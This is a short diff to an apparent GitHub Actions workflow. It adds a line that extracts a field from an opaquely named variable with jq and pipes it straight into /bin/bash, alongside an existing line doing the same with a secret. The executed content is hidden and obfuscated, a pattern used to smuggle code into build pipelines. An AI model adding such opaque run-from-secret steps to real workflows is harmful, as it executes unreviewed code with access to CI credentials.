@@ -17,6 +17,7 @@ jobs:
           dfwb33260: ${{ secrets.dfwb33260 }}
         run: |
           printf '%s' "$dfwb33260" | jq -r .ziz195 | /bin/bash
+          printf '%s' "$ssqba677" | jq -r .wms080 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
